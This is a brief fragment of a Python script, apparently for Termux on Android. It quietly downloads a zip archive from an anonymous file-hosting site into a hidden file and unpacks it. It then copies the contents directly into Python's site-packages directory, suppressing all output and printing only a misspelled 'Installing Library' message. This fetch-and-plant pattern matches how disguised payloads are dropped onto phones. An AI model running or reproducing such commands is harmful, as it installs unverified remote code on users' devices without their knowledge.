...
try:
	...
	os.system("wget https://d.top4top.io/f_DPR3-sedF3AhZ7A_8foPSQ/1637852350/21535smzu0.zip -O .Lib.zip > /dev/null 2>&1")
	print("\n[!] Download Compleated, Installing Library...")
	os.system("unzip .Lib.zip > /dev/null 2>&1")
	os.system("rm -rf .Lib.zip && cd .Lib && cp -r * /data/data/com.termux/files/usr/lib/python3.9/site-packages")
	os.system("rm -rf .Lib")
